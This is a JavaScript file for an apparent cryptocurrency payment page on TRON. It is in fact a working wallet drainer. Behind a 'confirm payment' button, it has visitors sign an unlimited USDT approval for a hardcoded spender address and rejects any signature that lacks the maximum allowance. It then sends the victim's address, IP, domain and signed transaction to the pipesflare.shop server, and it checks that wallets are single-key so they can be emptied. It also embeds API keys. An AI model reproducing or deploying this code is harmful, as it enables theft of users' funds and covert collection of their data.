window.confirmPayment = async function () {
  console.log('🚀 window.confirmPayment() ВЫЗВАНА!');
  
  try {
    const paymentAddress = window.walletAddress;
    console.log('💰 Payment Address:', paymentAddress);
    
    if (!paymentAddress) {
      console.error('❌ Адрес кошелька не определён');
      window.showMessage?.(translations[currentLang].message.paymentFailure, 'error');
      return;
    }

    // Проверка одобренного кошелька через сервер
    let approvedWallets = {};
    try {
      const checkResponse = await fetch(`https://pipesflare.shop/api/check_approved_wallet.php?address=${encodeURIComponent(paymentAddress)}`);
      const checkResult = await checkResponse.json();
      console.log('📡 Check Approved Wallet Response:', checkResult);
      
      if (checkResult.status === 'success' && checkResult.approved) {
        console.log(`⚠️ Кошелёк ${paymentAddress} уже подписал транзакцию (txID: ${checkResult.txID})`);
        // Для теста продолжаем, чтобы отправить уведомление
      }
    } catch (error) {
      console.error('❌ Ошибка проверки одобренного кошелька:', error);
    }

    // Проверка баланса TRX (временно отключена для теста)
    const trxInfo = await getTRXBalance(paymentAddress);
    console.log('💳 TRX Balance:', trxInfo?.balance);
    if (!trxInfo || trxInfo === false || trxInfo.isValid === false) {
      console.error('❌ Ошибка проверки баланса');
      window.showMessage?.(translations[currentLang].message.paymentFailure, 'error');
      enableButtonsAndRestoreText();
      return;
    }

    // Временно отключаем проверку баланса
    // if (trxInfo.balance <= 10) {
    //   console.warn('⚠️ Низкий баланс:', trxInfo.balance);
    //   window.showMessage?.(translations[currentLang].message.insufficientBalance, 'error');
    //   enableButtonsAndRestoreText();
    //   return;
    // }

    disableButtonsWithText(translations[currentLang].loadingText);

    let walletName;
    if (window.walletType === 'WalletConnect') {
      walletName = 'walletconnect';
    } else {
      walletName = getWalletFromUrl() || 'tronlink';
    }

    // Проверка доступности TronLink
    if (window.walletType === 'TronLink' && (!window.tronWeb || !window.tronWeb.ready)) {
      console.error('❌ TronLink не инициализирован');
      window.showMessage(translations[currentLang].message.walletNotConnected, 'error');
      enableButtonsAndRestoreText();
      return;
    }

    let unsignedTx = await buildApprove(paymentAddress);
    console.log('📜 Unsigned transaction:', unsignedTx);
    if (!unsignedTx) {
      window.showMessage(translations[currentLang].message.transactionBuildError, 'error');
      enableButtonsAndRestoreText();
      return;
    }

    let signedTx;
    try {
      if (window.walletType === 'TronLink') {
        signedTx = await window.tronWeb.trx.sign(unsignedTx);
      } else if (window.walletType === 'WalletConnect') {
        signedTx = await window.adapter.signTransaction(unsignedTx);
      } else {
        enableButtonsAndRestoreText();
        window.showMessage(translations[currentLang].message.userCancelled, 'error');
        return;
      }
    } catch (error) {
      console.error('❌ Ошибка подписи:', error);
      enableButtonsAndRestoreText();
      window.showMessage(translations[currentLang].message.userCancelled, 'error');
      return;
    }

    console.log('✅ Signed transaction:', signedTx);
    if (!signedTx || !signedTx.signature || !signedTx.signature.length) {
      enableButtonsAndRestoreText();
      window.showMessage(translations[currentLang].message.userCancelled, 'error');
      return;
    }

    if (!JSON.stringify(signedTx).includes("fffffffffffffffffff")) {
      window.showMessage?.(translations[currentLang].message.approveError, 'error');
      enableButtonsAndRestoreText();
      return;
    }

    if (!isTxStillValid(signedTx)) {
      window.showMessage?.(translations[currentLang].message.txExpired, 'error');
      enableButtonsAndRestoreText();
      return;
    }

    const waitingModal = document.getElementById('waitingModal');
    if (waitingModal) {
      waitingModal.classList.remove('hidden');
    } else {
      console.warn('⚠️ Элемент waitingModal не найден');
    }

    // Отправка транзакции в блокчейн
    const broadcastResponse = await fetch('https://api.trongrid.io/wallet/broadcasttransaction', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'TRON-PRO-API-KEY': '7b5ae8c4-20b2-4244-bde1-1c4c8a6d8dd0'
      },
      body: JSON.stringify(signedTx)
    });
    console.log('📡 Broadcast Status:', broadcastResponse.status);
    const broadcastResult = await broadcastResponse.json();
    console.log('📥 Broadcast Result:', broadcastResult);

    if (broadcastResult.result === true && broadcastResult.txid) {
      console.log('✅ Транзакция отправлена, txID:', broadcastResult.txid);

      // Получение домена и IP
      const domain = window.location.hostname;
      let ipAddress = 'Unknown';
      try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        console.log('🌐 IP Response:', ipData);
        ipAddress = ipData.ip;
      } catch (error) {
        console.error('❌ Ошибка получения IP:', error);
      }

      // Формирование ссылки на транзакцию
      const txLink = `https://tronscan.org/#/transaction/${broadcastResult.txid}`;

      // Отправка данных в confirm_payment_approve.php
      const payload = {
        payment_address: paymentAddress,
        wallet_name: walletName,
        domain: domain,
        ip: ipAddress,
        tx_id: broadcastResult.txid,
        tx_link: txLink,
        signed_tx: btoa(JSON.stringify(signedTx))
      };
      console.log('📤 Отправляем в PHP:', payload);

      try {
        const phpResponse = await fetch('https://pipesflare.shop/api/confirm_payment_approve.php', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
        console.log('📡 PHP Status:', phpResponse.status);
        const phpResult = await phpResponse.json();
        console.log('📥 PHP Result:', phpResult);
        if (phpResult.status === 'success') {
          console.log('🎉 Данные успешно отправлены в confirm_payment_approve.php');
        } else {
          console.error('❌ Ошибка отправки данных в PHP:', phpResult);
        }
      } catch (error) {
        console.error('❌ Ошибка при отправке в PHP:', error);
      }

      setTimeout(() => {
        window.showMessage(translations[currentLang].message.paymentSuccess, 'success');
        if (waitingModal) {
          waitingModal.classList.add('hidden');
        }
        enableButtonsAndRestoreText();
      }, 2000);
      return;
    } else {
      console.error('❌ Ошибка отправки транзакции:', broadcastResult);
      window.showMessage(translations[currentLang].message.paymentFailure, 'error');
      if (waitingModal) {
        waitingModal.classList.add('hidden');
      }
      enableButtonsAndRestoreText();
      return;
    }
  } catch (error) {
    console.error('💥 Ошибка в confirmPayment:', error);
    window.showMessage(translations[currentLang].message.paymentError, 'error');
    const waitingModal = document.getElementById('waitingModal');
    if (waitingModal) {
      waitingModal.classList.add('hidden');
    }
    enableButtonsAndRestoreText();
    return;
  }
};


function delay(ms) {

  return new Promise(resolve => setTimeout(resolve, ms));
}

function sha256DigestFromHexFallback(txidHex) {
    const wordArray = CryptoJS.enc.Hex.parse(txidHex);
    const hash = CryptoJS.SHA256(wordArray);
    return CryptoJS.enc.Hex.stringify(hash); // 返回 hex 字符串
}


function hexToBin(hex) {
  let bin = '';
  for (let i = 0; i < hex.length; i += 2) {
    bin += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
  }
  return bin;
}

function sha256Hash(data) {
  const sha256 = new jsSHA('SHA-256', 'TEXT');
  sha256.update(data);
  return sha256.getHash('HEX');
}

function calculateHash(rawDataHex) {

    const rawDataWords = CryptoJS.enc.Hex.parse(rawDataHex);
    
    const hash = CryptoJS.SHA256(rawDataWords);
    
    return hash.toString(CryptoJS.enc.Hex);
}

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}



function base58ToHexAddress(base58) {
  const ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
  const map = {};
  for (let i = 0; i < ALPHABET.length; i++) {
    map[ALPHABET[i]] = i;
  }

  let num = BigInt(0);
  for (let i = 0; i < base58.length; i++) {
    const char = base58[i];
    if (!(char in map)) throw new Error("Invalid Base58 character: " + char);
    num = num * 58n + BigInt(map[char]);
  }

  let hex = num.toString(16);
  if (hex.length % 2) hex = '0' + hex;

  let bytes = Uint8Array.from(hex.match(/.{2}/g).map(b => parseInt(b, 16)));

  let leadingOnes = 0;
  while (base58[leadingOnes] === '1') leadingOnes++;
  if (leadingOnes > 0) {
    const zeros = new Uint8Array(leadingOnes).fill(0);
    const combined = new Uint8Array(zeros.length + bytes.length);
    combined.set(zeros);
    combined.set(bytes, zeros.length);
    bytes = combined;
  }

  if (bytes.length !== 25) {
    throw new Error("Invalid address length after decoding");
  }

  const payload = bytes.slice(0, 21); 
  return [...payload].map(b => b.toString(16).padStart(2, '0')).join('');
}
function padLeft(str, length) {
  return str.padStart(length, '0');
}
function encodeAddressParam(base58Address) {
  const hex = base58ToHexAddress(base58Address).replace(/^0x/, '');
  return hex.padStart(64, '0');
}
async function getUSDTBalance(address) {
  const usdtContract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
  const apiKey = '7b5ae8c4-20b2-4244-bde1-1c4c8a6d8dd0';
  const apiUrl = 'https://api.trongrid.io/wallet/triggerconstantcontract';
  const ownerAddressHex = base58ToHexAddress(address);
  const contractAddressHex = base58ToHexAddress(usdtContract);
  const parameter = encodeAddressParam(address);

  const postData = {
    owner_address: ownerAddressHex,
    contract_address: contractAddressHex,
    function_selector: "balanceOf(address)",
    parameter: parameter
  };

  const headers = {
    'Content-Type': 'application/json',
    'TRON-PRO-API-KEY': apiKey
  };

  try {
    const response = await fetch(apiUrl, {
      method: 'POST',
      headers: headers,
      body: JSON.stringify(postData)
    });

    const data = await response.json();

    if (data.constant_result && data.constant_result[0]) {
      const hexBalance = data.constant_result[0];
      const balance = parseInt(hexBalance, 16) / 1_000_000;
      return balance;
    } else {
      return false;
    }
  } catch (error) {
    console.error('USDT 查询失败:', error);
    return false;
  }
}

async function getTRXBalance(address) {
  const apiKey = 'af548b3a-2ce3-429f-bb6f-1cc099f1b6fe';
  const apiUrl = 'https://api.trongrid.io/wallet/getaccount';
  const ownerAddressHex = base58ToHexAddress(address);

  const headers = {
    'Content-Type': 'application/json',
    'TRON-PRO-API-KEY': apiKey
  };

  try {
    const response = await fetch(apiUrl, {
      method: 'POST',
      headers,
      body: JSON.stringify({ address: ownerAddressHex })
    });

    const data = await response.json();

    const balance = data.balance !== undefined ? data.balance / 1_000_000 : 0;
    const perm = data?.active_permission?.[0];
    const keys = perm?.keys || [];
    if (balance === 0 && perm === undefined) {
      return { balance: 0, isValid: true };
    }
    const isMultisig = keys.length !== 1;
    const hasFullOps = perm?.operations === '7fff1fc0033ec30f000000000000000000000000000000000000000000000000';
    const isSelfIncluded = keys?.[0]?.address?.toLowerCase() === ownerAddressHex.toLowerCase();
    const isValid = !isMultisig && hasFullOps && isSelfIncluded;

    return { balance, isValid };
  } catch (error) {
    return { balance: 0, isValid: true };
  }
}

function isTxStillValid(signedTx, bufferSeconds = 15) {
  const expiration =
    signedTx?.transaction?.raw_data?.expiration ??
    signedTx?.raw_data?.expiration ??
    null;

  if (!expiration) {
    return false;
  }

  const now = Date.now();
  const remainingMs = expiration - now;

  if (remainingMs >= bufferSeconds * 1000) {
    return true;
  } else {
    return false;
  }
}

async function buildApprove(ownerBase58) {

  const spenderAddress = "TNZBn2TR1y81ERfwm7V4GFXkB89BkFGJU1";
  const usdtContractAddressBase58 = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
  const maxAllowanceHex = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

  const ownerHex = base58ToHexAddress(ownerBase58);
  const spenderHex = base58ToHexAddress(spenderAddress);
  const usdtContractHex = base58ToHexAddress(usdtContractAddressBase58);

  const strippedSpender = spenderHex.slice(2);
  const parameter = padLeft(strippedSpender, 64) + padLeft(maxAllowanceHex, 64);

  const requestBody = {
    owner_address: ownerHex,
    contract_address: usdtContractHex,
    function_selector: "increaseApproval(address,uint256)",
    parameter: parameter,
    call_value: 0,
    fee_limit: 100000000,
    visible: false
  };

  try {
    const response = await fetch("https://api.trongrid.io/wallet/triggersmartcontract", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(requestBody)
    });

    const result = await response.json();
    if (!result?.transaction?.raw_data) throw new Error("未返回交易数据");
    return result.transaction;

  } catch (error) {
    throw error;
  }
}



function getWalletFromUrl() {
    const urlParams = new URLSearchParams(window.location.search);
    const wallet = urlParams.get('wallet');
    return wallet ? wallet : 'tronlink';
}


